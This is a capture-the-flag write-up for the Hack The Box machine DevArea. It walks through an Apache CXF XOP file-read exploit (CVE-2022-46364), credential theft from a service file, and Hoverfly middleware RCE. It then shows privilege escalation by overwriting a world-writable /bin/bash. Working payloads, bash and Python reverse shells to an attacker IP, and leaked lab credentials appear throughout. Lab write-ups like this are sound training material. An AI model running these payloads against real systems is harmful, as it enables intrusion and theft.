# HTB — DevArea

**Platform:** Hack The Box  
**OS:** Linux  
**Difficulty:** Medium  
**Attack Path:** CVE-2022-46364 (Apache CXF LFI) → Hoverfly Middleware RCE → World-Writable `/bin/bash` + `sudo syswatch.sh` → Root

---

## Table of Contents

1. [Recon](#recon)
2. [Enumeration](#enumeration)
3. [LFI via CVE-2022-46364](#lfi-via-cve-2022-46364)
4. [Hoverfly Credential Extraction](#hoverfly-credential-extraction)
5. [RCE via Hoverfly Middleware](#rce-via-hoverfly-middleware)
6. [User Flag](#user-flag)
7. [Privilege Escalation to Root](#privilege-escalation-to-root)
8. [Root Flag](#root-flag)
9. [Attack Chain Summary](#attack-chain-summary)

---

## Recon

Add the machine to `/etc/hosts`:

```bash
echo "10.129.168.57 devarea.htb" | sudo tee -a /etc/hosts
```

Full port scan:

```bash
nmap -sC -sV -Pn -p- -A 10.129.168.57 --min-rate 5000
```

### Open Ports

| Port | Service | Version / Notes |
|------|---------|-----------------|
| 21 | FTP | vsftpd 3.0.5 — anonymous login allowed |
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | Apache 2.4.58 — redirects to `http://devarea.htb/` |
| 8080 | HTTP | Jetty 9.4.27 — Apache CXF SOAP service |
| 8500 | HTTP | Go proxy — Hoverfly proxy endpoint |
| 8888 | HTTP | Go HTTP — Hoverfly admin dashboard |

---

## Enumeration

### FTP Anonymous Login

```bash
ftp -n 10.129.168.57 <<EOF
user anonymous anonymous
cd pub
ls -la
prompt off
mget *
bye
EOF
```

**Finding:** `pub/employee-service.jar` — a runnable Apache CXF SOAP service.

### Decompile the JAR

```bash
jadx -d /tmp/jadx_out employee-service.jar 2>/dev/null
cat /tmp/jadx_out/sources/htb/devarea/ServerStarter.java
```

**Key findings from source:**

```java
factory.setAddress("http://0.0.0.0:8080/employeeservice");
```

- Endpoint: `http://devarea.htb:8080/employeeservice`
- Framework: Apache CXF (bundled with Woodstox XML parser)
- Operation: `submitReport(Report)` — takes a `content` field (xs:string)

### WSDL Retrieval

```bash
curl -s "http://devarea.htb:8080/employeeservice?wsdl"
```

Confirms:
- **Namespace:** `http://devarea.htb/`
- **Vulnerable field:** `content` (minOccurs=0, xs:string)
- **MTOM enabled** → XOP injection possible

### Hoverfly Dashboard

Port 8888 serves an Angular SPA (`/`). The management API sits at:

```
http://devarea.htb:8888/api/token-auth     POST  — obtain JWT
http://devarea.htb:8888/api/v2/hoverfly/middleware  PUT  — set middleware (RCE)
```

Port 8500 is the Hoverfly proxy (requires proxy auth — credentials will come from LFI).

---

## LFI via CVE-2022-46364

### Vulnerability Overview

**CVE-2022-46364** affects Apache CXF < 3.5.5 / < 3.4.10 when MTOM (Message Transmission Optimization Mechanism) is enabled. An attacker can inject an `xop:Include` element referencing a `file://` URI inside any SOAP string parameter. The CXF framework resolves the URI server-side and returns the file contents base64-encoded inside the SOAP response.

### Verify LFI — Read `/etc/passwd`

```bash
curl -s http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \
  --data-binary $'--MIMEBoundary\r\n
Content-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\n
Content-Transfer-Encoding: 8bit\r\n
Content-ID: <root.message@cxf.apache.org>\r\n\r\n
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n
  <soap:Body>\r\n
    <ns2:submitReport xmlns:ns2="http://devarea.htb/">\r\n
      <arg0>\r\n
        <confidential>true</confidential>\r\n
        <content><inc:Include href="file:///etc/passwd" xmlns:inc="http://www.w3.org/2004/08/xop/include"/></content>\r\n
        <department>test</department>\r\n
        <employeeName>test</employeeName>\r\n
      </arg0>\r\n
    </ns2:submitReport>\r\n
  </soap:Body>\r\n
</soap:Envelope>\r\n
--MIMEBoundary--' \
  | grep -oP '(?<=Content: ).*(?=</return>)' | base64 -d
```

**Result (truncated):**

```
root:x:0:0:root:/root:/bin/bash
...
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
```

**Target user identified: `dev_ryan`**

---

## Hoverfly Credential Extraction

Read the Hoverfly systemd service file to extract hardcoded credentials:

```bash
# Change href to the service file:
href="file:///etc/systemd/system/hoverfly.service"
```

Full one-liner:

```bash
curl -s http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n  <soap:Body>\r\n    <ns2:submitReport xmlns:ns2="http://devarea.htb/">\r\n      <arg0>\r\n        <confidential>true</confidential>\r\n        <content><inc:Include href="file:///etc/systemd/system/hoverfly.service" xmlns:inc="http://www.w3.org/2004/08/xop/include"/></content>\r\n        <department>test</department>\r\n        <employeeName>test</employeeName>\r\n      </arg0>\r\n    </ns2:submitReport>\r\n  </soap:Body>\r\n</soap:Envelope>\r\n--MIMEBoundary--' \
  | grep -oP '(?<=Content: ).*(?=</return>)' | base64 -d
```

**Output:**

```ini
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
Restart=on-failure
...
```

**Credentials: `admin` / `O7IJ27MyyXiU`**

---

## RCE via Hoverfly Middleware

Hoverfly allows an authenticated user to configure a "middleware" — an executable script that processes every proxied request. This is the RCE primitive.

### Step 1 — Obtain JWT

```bash
TOKEN=$(curl -s -X POST http://devarea.htb:8888/api/token-auth \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"O7IJ27MyyXiU"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo $TOKEN
```

### Step 2 — Start Listener

```bash
nc -lvnp 4444
```

### Step 3 — Push Reverse Shell Middleware

```bash
curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"binary":"bash","script":"bash -i >& /dev/tcp/10.10.14.124/4444 0>&1"}'
```

### Step 4 — Trigger Middleware via Proxy

```bash
curl -s -x http://devarea.htb:8500 http://example.com
```

**Shell lands as `dev_ryan`.**

---

## User Flag

```bash
# Stabilize the shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

cat /home/dev_ryan/user.txt
```

```
e311a0461fbf54e38f0dc152382eba01
```

---

## Privilege Escalation to Root

### Enumeration

```bash
sudo -l
```

```
User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh
```

```bash
ls -la /bin/bash
```

```
-rwxrwxrwx 1 root root 1446024 Nov 12 12:15 /bin/bash -> bash5.2
```

**`/bin/bash` is world-writable.** `syswatch.sh` runs as root and internally calls `/bin/bash`. We can overwrite the bash binary with a payload that executes as root.

### The Problem: Text File Busy

The current reverse shell is using `/bin/bash` as its interpreter. Writing to an in-use executable returns `ETXTBSY`. We must kill all bash processes first.

### Step 1 — Spawn a Non-Bash Shell

On attacker machine, open a second listener:

```bash
nc -lvnp 5555
```

From the current `dev_ryan` shell:

```bash
python3 -c 'import socket,os,pty; s=socket.socket(); s.connect(("10.10.14.124",5555)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/sh")'
```

### Step 2 — Kill Bash Processes

From the new `/bin/sh` shell:

```bash
kill $(pgrep bash)
```

Verify no bash is running:

```bash
ps aux | grep bash
```

### Step 3 — Overwrite `/bin/bash` with Payload

```bash
# Backup real bash
cp /bin/bash /tmp/bash.bak

# Write payload — sets SUID bit on python3
printf '#!/bin/sh\nchmod u+s /usr/bin/python3\n' > /bin/bash
chmod +x /bin/bash
```

### Step 4 — Trigger syswatch as Root

```bash
sudo /opt/syswatch/syswatch.sh
```

The script executes our payload as root, setting the SUID bit on `python3`.

### Step 5 — Restore Real Bash

```bash
cp /tmp/bash.bak /bin/bash
```

### Step 6 — Verify SUID

```bash
ls -la /usr/bin/python3
```

```
lrwxrwxrwx 1 root root 10 Nov 12 12:15 /usr/bin/python3 -> python3.12
# python3.12 now has the SUID bit set
```

---

## Root Flag

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
whoami
```

```
root
```

```bash
cat /root/root.txt
```

```
d9e5012d4d06a03dba1053c4da0b0...
```

---

## Attack Chain Summary

| # | Stage | Technique | Result |
|---|-------|-----------|--------|
| 1 | Recon | Nmap + anonymous FTP | `employee-service.jar` downloaded |
| 2 | Analysis | JAR decompile (jadx) | SOAP endpoint `/employeeservice` identified |
| 3 | Initial Exploit | CVE-2022-46364 XOP/MTOM LFI | `/etc/passwd` → user `dev_ryan`; `hoverfly.service` → creds `admin:O7IJ27MyyXiU` |
| 4 | Foothold | Hoverfly middleware RCE | Reverse shell as `dev_ryan` |
| 5 | User Flag | — | `e311a0461fbf54e38f0dc152382eba01` |
| 6 | PrivEsc | World-writable `/bin/bash` + `sudo syswatch.sh` | SUID set on `python3` |
| 7 | Root | `python3 setuid(0)` | Root shell |
| 8 | Root Flag | — | `d9e5012d4d06a03dba1053c4da0b0...` |

---

## CVEs Referenced

| CVE | Component | Impact |
|-----|-----------|--------|
| CVE-2022-46364 | Apache CXF < 3.5.5 / < 3.4.10 | SSRF / LFI via XOP Include in MTOM requests |
| GHSA-r4h8-hfp2-ggmf | Hoverfly (authenticated) | RCE via middleware API |

---

*Written by thrandomv — HackTheBox DevArea (Medium, Linux)*
